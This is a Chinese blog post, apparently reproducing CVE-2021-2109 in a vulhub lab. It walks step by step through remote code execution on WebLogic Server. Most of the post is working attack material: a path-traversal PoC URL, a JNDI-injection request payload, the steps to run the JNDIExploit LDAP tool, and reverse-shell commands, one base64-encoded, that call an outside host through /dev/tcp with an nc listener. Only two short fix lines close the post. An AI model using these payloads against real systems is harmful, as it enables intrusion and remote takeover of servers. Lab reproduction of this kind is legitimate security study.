# Weblogic Server 远程代码执行漏洞(CVE-2021-2109) - 学安全的小白 - 博客园

> 原文：[`www.cnblogs.com/pursue-security/p/17029537.html`](https://www.cnblogs.com/pursue-security/p/17029537.html)

影响版本 WebLogic Server 10.3.6.0.0WebLogic Server 12.1.3.0.0WebLogic Server 12.2.1.3.0WebLogic Server 12.2.1.4.0WebLogic Server 14.1.1.0.0 漏洞 poc 以 get 方式请求[`192.168.116.133:7001/console/css/%252e%252e%252f/consolejndi.portal`](http://192.168.116.133:7001/console/css/%252e%252e%252f/consolejndi.portal)，出现如图结果即确定漏洞存在。![0](img/33645660bd24f18ad5622521625373b8.png)漏洞复现靶场环境为：vulhub weblogic CVE-2020-14882 利用工具 JNDIExploit-1.3-SNAPSHOT.jar 运行 ldap 需要 java1.8 环境 1、启动 ldap 服务 -i 后面为 vps 的 ip 地址 java -jar JNDIExploit-1.3-SNAPSHOT.jar -i xx.xx.xx.xx![](img/1fba5e27cc90d963bbe4a5247a19d073.png)2、抓包，payload 后面加入 poc, 然后再在请求包头部里面加入 cmd:pwd(命令) ，如下图所示:poc 如下: 注意：ldap 后面的 ip 地址中，最后一位地址前是;不是.

```
_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://x.x.x;x:1389/Basic/WeblogicEcho;AdminServer%22)
```

![](img/91f3f6823f15a3a813f305976b0de303.png)

ldap 接收到数据：![0](img/7998844ecfa03ac81fd2e8fdcaa984d3.png)3、反弹 shell 对反弹 shell 命令进行 base64 编码,x.x.x.x 为 vps 监听地址 bash -i >& /dev/tcp/xx.xx.xx.xx/12345 0>&1vps 开启 nc 监听 nc -lvvp 12345 执行如下命令

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMTY4LjYyLjE0My8xMjM0NSAwPiYxCgo=}|{base64,-d}|{bash,-i}
```

将请求头中的 cmd 字段值修改为编码后的反弹 shell 命令。burp 发送数据包，此时返回为空。![0](img/b065837ac3f7934c2a4cd906197c9b1b.png)ldap 服务不能关 要在反弹 shell 的同时开启 ldap 服务。![0](img/a1284392f01e8f3c3350ab2413d81952.png)备注： 有时候可能出现反弹不成功，可以多试几次。

# 漏洞修复

1、建议用户及时将 Weblogic 后台/console/console.portal 对外的访问权限暂时关闭。2、更新到不受该漏洞影响的版本